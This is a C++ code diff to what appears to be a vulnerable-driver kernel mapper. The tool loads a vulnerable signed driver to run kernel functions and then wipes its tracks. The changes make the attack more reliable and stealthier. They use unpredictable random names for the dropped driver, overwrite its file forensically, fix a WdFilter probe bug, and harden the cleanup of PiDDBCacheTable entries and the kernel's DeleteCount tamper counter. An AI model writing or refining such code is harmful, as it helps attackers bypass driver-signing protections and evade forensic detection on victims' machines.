@@ -21,6 +21,7 @@
 #include <fstream>
 #include <filesystem>
 #include <memory>
+#include <random>
 #include <sstream>
 #include <vector>
 #include <iostream> //Log() writes through std::wcout at the point of use
@@ -61,11 +62,33 @@ bool Driver::g_skipForensicCleanup = false;
 static std::string cachedDriverName = "";
 
 /*
+ * The process-wide PRNG, seeded once from std::random_device.
+ *
+ * Replaces srand(time(NULL) * GetCurrentThreadId()) + rand(). That seed is
+ * guessable - two runs started in the same second on the same thread id
+ * collide - and rand() is a low quality LCG whose output is predictable from a
+ * few samples. Both consumers want bytes an observer cannot anticipate: the
+ * provider name is matched against kernel structures during cleanup, and the
+ * file overwrite is forensic.
+ *
+ * Seeded lazily on first use so there is no separate init step to forget, and
+ * shared by every consumer so the name and the wipe draw from one stream.
+ */
+static std::mt19937_64& RandomEngine() {
+	static std::mt19937_64 engine{ std::random_device{}() };
+	return engine;
+}
+
+/*
  * Random alphanumeric name for the dropped provider and its service.
  *
  * Generated once per run and cached, because the same name has to be used for
  * the file, the service key, the PiDDB entry and the hash bucket entry: they
  * are matched against each other during cleanup.
+ *
+ * The shape is unchanged from the rand() version: 10..29 characters drawn from
+ * the 52 letters in alphanum, so every forensic matcher downstream still sees
+ * the same format.
  */
 std::wstring Driver::GetDriverNameW() {
 	if (cachedDriverName.empty()) {
@@ -74,9 +97,12 @@ std::wstring Driver::GetDriverNameW() {
 		static const char alphanum[] =
 			"abcdefghijklmnopqrstuvwxyz"
 			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-		int len = rand() % 20 + 10;
+		auto& engine = RandomEngine();
+		std::uniform_int_distribution<int> length_dist(10, 29);
+		std::uniform_int_distribution<size_t> char_dist(0, sizeof(alphanum) - 2);
+		int len = length_dist(engine);
 		for (int i = 0; i < len; ++i)
-			buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+			buffer[i] = alphanum[char_dist(engine)];
 		cachedDriverName = buffer;
 	}
 
@@ -143,8 +169,6 @@ NTSTATUS Driver::AcquireDebugPrivilege() {
  * Any failure calls Unload(), so a partially loaded run leaves nothing behind.
  */
 NTSTATUS Driver::Load() {
-	srand((unsigned)time(NULL) * GetCurrentThreadId());
-
 	Log(L"[!] Using vulnerable driver provider: " << Val(Provider::kShortName) << L", Device: " << Val(Provider::kDeviceName) << std::endl);
 
 	//If the provider driver is already running on the system (vendor software
@@ -495,9 +519,10 @@ static bool WdFilterProbeMapped(uint64_t address) {
 	if (!WdFilterIsKernel(address))
 		return false;
 	static uint64_t kernel_MmIsAddressValid = 0;
-	static bool resolved = false;
-	if (!resolved) {
-		resolved = true;
+	//Retry-on-zero, not a one-shot "attempted" flag: a first call made before
+	//ntoskrnlAddr was resolved used to cache the failure permanently and every
+	//later probe silently fell back to the range check alone.
+	if (!kernel_MmIsAddressValid) {
 		kernel_MmIsAddressValid = Driver::GetKernelModuleExport(Driver::ntoskrnlAddr, "MmIsAddressValid");
 	}
 	//No probe available: fall back to the range check alone. The walk still
@@ -1084,8 +1109,13 @@ NTSTATUS Driver::Unload() {
 		}
 
 		auto random_data = std::make_unique<BYTE[]>(static_cast<size_t>(original_size));
+		//Same 0..255 byte range as the rand() version, drawn from the shared
+		//engine so the overwrite is not predictable from the name it shares a
+		//seed with.
+		auto& engine = RandomEngine();
+		std::uniform_int_distribution<int> byte_dist(0, 255);
 		for (size_t i = 0; i < static_cast<size_t>(original_size); ++i)
-			random_data[i] = static_cast<BYTE>(rand() % 256);
+			random_data[i] = static_cast<BYTE>(byte_dist(engine));
 
 		file_stream.write(reinterpret_cast<const char*>(random_data.get()), original_size);
 		file_stream.flush();
@@ -1706,6 +1736,22 @@ static bool ProbePteSelfMapBase() {
 		return result;
 	}
 
+/*
+ * The assumed 4-argument signature of MmAllocateIndependentPagesEx.
+ *
+ * The routine has no prototype in the public SDK, so this is the shape the
+ * mapper calls it with, written down in one place. The call below goes through
+ * CallKernelFunction, which forwards arguments through registers and accepts
+ * any list, so the compiler would not catch a drift between this typedef and
+ * the real prototype - the typedef exists so the assumption is explicit and
+ * reviewable instead of implied by the argument list at the call site.
+ *
+ * The arguments are (size, -1, 0, 0): size is the requested length, and the
+ * three trailing values are the partition and reserved parameters the
+ * reference implementation passes.
+ */
+typedef PVOID(__stdcall* MmAllocateIndependentPagesExFn)(uint32_t size, int partition, int reserved1, int reserved2);
+
 //Allocate page aligned kernel memory for the --indPages mode, which needs one
 //allocation whose protection can be set per section.
 //Returns 0 on failure.
@@ -1724,6 +1770,7 @@ uint64_t Driver::MmAllocateIndependentPagesEx(uint32_t size)
 		}
 		kernel_MmAllocateIndependentPagesEx += Driver::ntoskrnlAddr;
 	}
+	//(size, -1, 0, 0) matches the assumed MmAllocateIndependentPagesExFn above.
 	if (!Driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
 		return 0;
 
@@ -2504,7 +2551,7 @@ bool Driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
 		}
 	}
 
-	BOOLEAN out;
+	BOOLEAN out = FALSE;
 
 	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
 }
@@ -2540,7 +2587,7 @@ BOOLEAN Driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
 		}
 	}
 
-	bool out;
+	bool out = false;
 	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
 }
 
@@ -2559,7 +2606,7 @@ PVOID Driver::RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Bu
 		}
 	}
 
-	PVOID out;
+	PVOID out = nullptr;
 
 	if (!CallKernelFunction(&out, kernel_RtlLookupElementGenericTableAvl, Table, Buffer))
 		return 0;
@@ -2667,9 +2714,17 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	//The layout of this type is not available from the public PDBs, so the
 	//DriverName field is located by content instead of by a hardcoded offset,
 	//and only that verified offset is used below.
+	//
+	//The scan window is the real size of _PiDDBCacheEntry, not a round 0x80.
+	//The struct is 0x38 bytes, so a 0x80 window read up to 0x48 bytes past it -
+	//off the end of the pool block and, for an entry that ends near a page
+	//boundary, into an unmapped page, where the provider's memcpy faults
+	//instead of returning false. Bounding to the struct means the scan only
+	//examines offsets a UNICODE_STRING can actually occupy, and the real
+	//DriverName (offset 0x10) is still inside that range.
 	{
 		const std::wstring needle = n;
-		const uint32_t name_field = FindUnicodeStringFieldByContent((uint64_t)pFoundEntry, 0x80, needle);
+		const uint32_t name_field = FindUnicodeStringFieldByContent((uint64_t)pFoundEntry, sizeof(Nt::PiDDBCacheEntry), needle);
 		if (name_field == 0) {
 			Log(L"[-] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
 			ExReleaseResourceLite(PiDDBLock);
@@ -2723,11 +2778,24 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 		return false;
 	}
 
+	//Decrement DeleteCount with checked I/O, matching the WdFilter cleanup. A
+	//failed read must not be treated as "nothing to do" - that leaves the
+	//kernel's tamper signal (the count) inconsistent with the table - and a
+	//failed write means the two have diverged. Both release the lock and
+	//report the failure rather than silently continuing.
 	ULONG cacheDeleteCount = 0;
-	ReadMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG));
+	if (!ReadMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG))) {
+		Log(L"[-] Could not re-read PiDDBCacheTable DeleteCount, state may be inconsistent" << std::endl);
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
 	if (cacheDeleteCount > 0) {
 		cacheDeleteCount--;
-		WriteMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG));
+		if (!WriteMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG))) {
+			Log(L"[-] Failed to decrement PiDDBCacheTable DeleteCount" << std::endl);
+			ExReleaseResourceLite(PiDDBLock);
+			return false;
+		}
 	}
 
 	// release the ddb resource lock
